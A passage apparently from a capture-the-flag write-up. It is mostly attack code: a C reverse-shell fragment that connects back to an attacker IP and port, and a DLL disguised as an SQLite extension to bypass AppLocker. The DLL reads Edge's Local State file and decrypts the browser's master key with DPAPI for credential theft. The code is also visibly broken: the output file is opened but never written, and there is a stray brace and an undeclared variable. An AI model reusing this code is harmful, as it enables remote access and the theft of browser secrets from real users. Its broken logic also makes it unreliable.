We get the following.

```C
        struct sockaddr_in hax; 
        char ip_addr[16] = "10.10.14.117"; 
        char port[6] = "9001";

        PROCESS_INFORMATION processo_info;

        hax.sin_port = htons(atoi(port));
        hax.sin_addr.s_addr = inet_addr(ip_addr);

        memset(&ini_processo, 0, sizeof(ini_processo));
```

We can see that the magic bytes contain a `DPAPI` signature we'll need to run the `CryptUnprotectData` function on this key. So let's write a binary to read the file, decode and decrypt the key, it'll have to be another `sqlite3 dll` as the app locker policy is quite strong on this machine.

```C
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

// Hardcoded Paths
#define TARGET_FILE "C:\\Users\\web\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
#define OUTPUT_FILE "C:\\Windows\\Tasks\\masterkey.txt"

// The correct signature for SQLite extensions
__declspec(dllexport) int __stdcall sqlite3_extension_init(void *db, char **pzErrMsg, void *pApi) {
    
    // Check if the source file exists before trying to decrypt
    DWORD dwAttrib = GetFileAttributesA(TARGET_FILE);
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) return 0; 

    HANDLE hFile = CreateFileA(TARGET_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD fileSize = GetFileSize(hFile, NULL);
        char* buffer = (char*)LocalAlloc(LPTR, fileSize + 1);
        DWORD bytesRead;
        
        if (ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
            const char* keyLabel = "\"encrypted_key\":\"";
            char* start = strstr(buffer, keyLabel);
            if (start) {
                start += 17;
                char* end = strchr(start, '\"');
                if (end) {
                    *end = '\0';
                    DWORD binaryLen = 0;
                    CryptStringToBinaryA(start, 0, CRYPT_STRING_BASE64, NULL, &binaryLen, NULL, NULL);
                    BYTE* binaryKey = (BYTE*)LocalAlloc(LPTR, binaryLen);
                    CryptStringToBinaryA(start, 0, CRYPT_STRING_BASE64, binaryKey, &binaryLen, NULL, NULL);

                    DATA_BLOB dataIn = { binaryLen - 5, binaryKey + 5 };
                    DATA_BLOB dataOut = { 0, NULL };

                    if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
                        DWORD b64Len = 0;
                        CryptBinaryToStringA(dataOut.pbData, dataOut.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
                        char* finalB64 = (char*)LocalAlloc(LPTR, b64Len);
                        CryptBinaryToStringA(dataOut.pbData, dataOut.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, finalB64, &b64Len);

                        HANDLE hOut = CreateFileA(OUTPUT_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

                        }
                        LocalFree(finalB64);
                        LocalFree(dataOut.pbData);
                    }
                    LocalFree(binaryKey);
                }
            }
        }
        LocalFree(buffer);
        CloseHandle(hFile);
    }

    return 0; // SQLITE_OK
}
```
